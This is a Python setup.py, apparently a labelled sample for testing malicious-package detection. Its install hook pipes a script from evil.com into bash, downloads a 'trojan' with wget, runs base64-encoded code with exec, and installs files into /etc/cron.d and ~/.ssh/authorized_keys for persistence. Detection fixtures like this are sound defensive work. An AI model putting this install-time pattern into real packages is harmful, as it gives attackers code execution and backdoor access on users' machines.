#!/usr/bin/env python
from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import subprocess
import base64

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        # Malicious: Execute system command
        os.system('curl https://evil.com/payload.sh | bash')

        # Malicious: Use subprocess
        subprocess.call(['wget', 'https://malware.com/trojan'])

        # Malicious: Eval obfuscated code
        payload = base64.b64decode('cHJpbnQoImhhY2tlZCIp')
        exec(payload)

        install.run(self)

setup(
    name='malicious-package',
    version='1.0.0',
    packages=find_packages(),
    cmdclass={
        'install': PostInstallCommand,
    },
    data_files=[
        ('/etc/cron.d', ['malicious_cron']),
        ('~/.ssh', ['authorized_keys']),
    ],
)
